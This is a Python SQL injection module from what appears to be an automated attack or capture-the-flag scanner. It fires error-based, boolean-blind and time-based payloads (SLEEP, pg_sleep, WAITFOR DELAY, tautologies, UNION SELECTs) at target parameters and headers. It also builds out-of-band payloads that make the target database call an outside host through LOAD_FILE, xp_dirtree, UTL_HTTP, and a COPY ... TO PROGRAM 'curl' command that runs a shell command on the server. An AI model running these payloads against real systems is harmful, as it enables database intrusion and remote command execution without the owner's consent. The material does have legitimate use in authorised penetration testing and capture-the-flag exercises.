"""
SQL Injection attack module.
Covers: error-based, boolean-based blind, time-based blind, union-based.
"""
from __future__ import annotations
import asyncio
import time

from attacks.base import BaseAttack
from engine.flag_hunter import has_definite_flag
from rich.console import Console

console = Console(legacy_windows=False)

ERROR_SIGNATURES = [
    "sql syntax", "mysql_fetch", "ora-0", "pg_query", "sqlite_",
    "mssql", "microsoft sql", "syntax error", "unclosed quotation",
    "you have an error in your sql", "warning: mysql", "division by zero",
    "supplied argument is not a valid mysql", "column count doesn't match",
    "unknown column", "table or view does not exist", "quoted string not properly terminated",
]

TIME_PAYLOADS = [
    # String context with valid base ID: user_id='1' AND SLEEP(3)-- → exactly 1 row → 3 s
    # Preferred over bare ' variants — AND short-circuits on empty match, OR runs for every row
    "1' AND SLEEP(3)-- ",
    "1' AND SLEEP(3)#",
    "1' AND pg_sleep(3)-- ",
    "1'; WAITFOR DELAY '0:0:3'-- ",
    # Bare-quote variants (numeric context or OR-based login forms)
    "' AND SLEEP(3)-- ",
    "' AND SLEEP(3)#",
    "' OR SLEEP(3) AND '1'='1",   # OR that limits to 1 match via AND in same expr
    "' OR SLEEP(3)-- ",
    "' OR SLEEP(3)#",
    "' AND pg_sleep(3)-- ",
    "'; WAITFOR DELAY '0:0:3'-- ",
    "1 AND SLEEP(3)-- ",
    "1 AND SLEEP(3)#",
    "1 OR SLEEP(3)-- ",
    "1; SELECT pg_sleep(3)-- ",
]

# (true_condition, false_condition) pairs for boolean-blind detection.
# If the server returns different responses for these, SQL is evaluated server-side.
BOOLEAN_PAIRS = [
    # Valid base ID: user_id='1' exists → true/false gives different row counts
    ("1' AND '1'='1'-- ", "1' AND '1'='2'-- "),  # string context, valid base
    ("1' AND 1=1-- ", "1' AND 1=2-- "),            # string context, numeric condition
    # Bare-quote fallback
    ("' AND '1'='1'-- ", "' AND '1'='2'-- "),     # string context, MySQL/MSSQL
    ("' AND 1=1-- ", "' AND 1=2-- "),              # alt syntax
    ("1 AND 1=1-- ", "1 AND 1=2-- "),              # numeric param
    ("' OR '1'='1'-- ", "' OR '1'='2'-- "),       # login form (WHERE user=X OR ...)
]

ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    '"',
    "\\",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "1' AND 1=CONVERT(int, @@version)--",
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' UNION SELECT null--",
    "' UNION SELECT null,null--",
    "' UNION SELECT null,null,null--",
]


# Global: only 1 SQLi time-based test runs at a time across all concurrent attack tasks.
# Prevents parallel SLEEP(n) queries from overloading the DB, which would make every
# unrelated page respond slowly and cross the elapsed threshold (false positives).
_TIME_SEM: asyncio.Semaphore | None = None


def _get_time_sem() -> asyncio.Semaphore:
    global _TIME_SEM
    if _TIME_SEM is None:
        _TIME_SEM = asyncio.Semaphore(1)
    return _TIME_SEM


class SQLiAttack(BaseAttack):
    name = "sqli"

    async def run(self, attack_point: dict, payloads: list[str]) -> list[dict]:
        url = attack_point["url"]
        param = attack_point.get("param")
        method = attack_point.get("method", "GET")
        is_header = attack_point.get("input_type") == "header"

        if not param:
            return []

        location = f"header:{param}" if is_header else f"?{param}"
        console.print(f"  [cyan][SQLi][/cyan] {method} {url} {location}")

        all_findings = []
        seen = set(payloads or [])
        extra = [p for p in ERROR_PAYLOADS if p not in seen]
        combined_payloads = list(payloads or []) + extra

        # Phase 1: Error-based
        error_confirmed = False
        for payload in combined_payloads:
            if self._should_stop():
                break

            response, findings = await self._try_payload(
                method, url, param, payload, as_header=is_header
            )
            if response is None:
                continue

            body_lower = response.text.lower()
            is_error_based = any(sig in body_lower for sig in ERROR_SIGNATURES)

            if is_error_based and not error_confirmed:
                error_confirmed = True
                _matched_sig = next((s for s in ERROR_SIGNATURES if s in body_lower), "")
                _idx = body_lower.find(_matched_sig)
                _err_ctx = response.text[max(0, _idx - 20):_idx + 120].strip() if _idx >= 0 else ""
                console.print(
                    f"  [bold red][SQLi][/bold red] Error-based hit! Payload: {payload!r}"
                    + (f"\n  [dim]  error: {_err_ctx!r}[/dim]" if _err_ctx else "")
                )
                all_findings.append({
                    "type": "sqli_error",
                    "value": f"Error-based SQLi @ {url} {location} payload={payload!r}",
                    "confidence": 0.9,
                })

            flag_findings = [f for f in findings if f.get("confidence", 0) >= 1.0]
            if flag_findings:
                all_findings.extend(flag_findings)
                flag = has_definite_flag(flag_findings)
                if flag:
                    console.print(f"  [bold green][SQLi][/bold green] FLAG: {flag}")
                    self.stop_event.set()
                    return all_findings

            if error_confirmed:
                break

        # Phase 2: Boolean-blind (only if no error found — fast, 2 req/pair)
        boolean_confirmed = False
        if not error_confirmed:
            bl_resp, _ = await self._try_payload(
                method, url, param, "tweb_bool_baseline_noop", as_header=is_header
            )
            bl_len = len(bl_resp.text) if bl_resp else -1

            for true_pay, false_pay in BOOLEAN_PAIRS:
                if self._should_stop():
                    break
                true_resp, _ = await self._try_payload(
                    method, url, param, true_pay, as_header=is_header
                )
                false_resp, _ = await self._try_payload(
                    method, url, param, false_pay, as_header=is_header
                )
                if true_resp is None or false_resp is None:
                    continue

                t_len = len(true_resp.text)
                f_len = len(false_resp.text)
                diff = abs(t_len - f_len)
                threshold = max(50, int(max(t_len, f_len) * 0.05))

                if diff >= threshold:
                    # At least one side should resemble the baseline (rules out
                    # both conditions returning unrelated different content).
                    if bl_len > 0:
                        true_near_bl = abs(t_len - bl_len) < threshold
                        false_near_bl = abs(f_len - bl_len) < threshold
                        if not (true_near_bl or false_near_bl):
                            continue

                    boolean_confirmed = True
                    console.print(
                        f"  [bold red][SQLi][/bold red] Boolean-blind hit! "
                        f"true:{t_len}B vs false:{f_len}B (diff:{diff}) "
                        f"Payload: {true_pay!r}"
                    )
                    all_findings.append({
                        "type": "sqli_boolean_blind",
                        "value": (
                            f"Boolean-blind SQLi @ {url} {location} "
                            f"(diff:{diff}B, payload={true_pay!r})"
                        ),
                        "confidence": 0.8,
                    })
                    break

        # Phase 3: Time-based (only if no error or boolean found — slow, 3s/payload)
        if not error_confirmed and not boolean_confirmed:
            # Serialise time-based tests globally.  When all 32 attack-point tasks run
            # concurrently they each queue SLEEP(3) payloads simultaneously, overloading
            # MySQL and making every page — even non-SQLi ones — respond in ≥3 s.
            # Holding this semaphore ensures only one SLEEP is in-flight at a time, so
            # the baseline and the payload are both measured on a quiescent database.
            async with _get_time_sem():
                baseline_time = 0.0
                try:
                    t_b = time.monotonic()
                    await self._try_payload(
                        method, url, param, "tweb_timebased_baseline_noop", as_header=is_header
                    )
                    baseline_time = time.monotonic() - t_b
                except Exception:
                    pass

                for time_payload in TIME_PAYLOADS:
                    if self._should_stop():
                        break
                    t0 = time.monotonic()
                    response, findings = await self._try_payload(
                        method, url, param, time_payload, as_header=is_header
                    )
                    elapsed = time.monotonic() - t0

                    # Skip timeouts (response=None, elapsed≈10s): a real SLEEP(3)
                    # returns a response in ~3 s; a None means network/DB error.
                    if response is None:
                        continue

                    if elapsed >= 2.8 and (elapsed - baseline_time) >= 2.5:
                        console.print(
                            f"  [bold red][SQLi][/bold red] Time-based hit! "
                            f"({elapsed:.1f}s, baseline {baseline_time:.1f}s) Payload: {time_payload!r}"
                        )
                        all_findings.append({
                            "type": "sqli_time_based",
                            "value": f"Time-based SQLi ({elapsed:.1f}s) @ {url} {location}",
                            "confidence": 0.85,
                        })
                        break

        # Phase 4: OOB SQL injection (only when OOB server is configured)
        if self.oob and not self._should_stop():
            token = self.oob.generate_token("sqli")
            oob_url = f"{self.oob.public_url}/{token}"
            oob_host = self.oob.public_url.replace("http://", "").replace("https://", "").rstrip("/")
            oob_payloads = [
                f"1 AND LOAD_FILE(0x{('//' + oob_host + '/' + token).encode().hex()})",
                f"1; EXEC master..xp_dirtree '//{oob_host}/{token}'-- ",
                f"1; COPY (SELECT '') TO PROGRAM 'curl {oob_url}'-- ",
                f"1 UNION SELECT UTL_HTTP.REQUEST('{oob_url}') FROM dual-- ",
            ]
            console.print(f"  [dim][SQLi] OOB deneniyor ({oob_host})...[/dim]")
            for oob_payload in oob_payloads:
                if self._should_stop():
                    break
                await self._try_payload(
                    method, url, param, oob_payload, as_header=is_header
                )

            await asyncio.sleep(2.0)
            if self.oob.was_triggered(token):
                info = self.oob.get_hit_info(token)
                console.print(
                    f"  [bold red][SQLi][/bold red] OOB callback! src={info.get('source_ip')}"
                )
                all_findings.append({
                    "type": "sqli_oob",
                    "value": (
                        f"OOB SQL injection @ {url} {location} "
                        f"— callback from {info.get('source_ip')}"
                    ),
                    "confidence": 0.90,
                })

        return all_findings
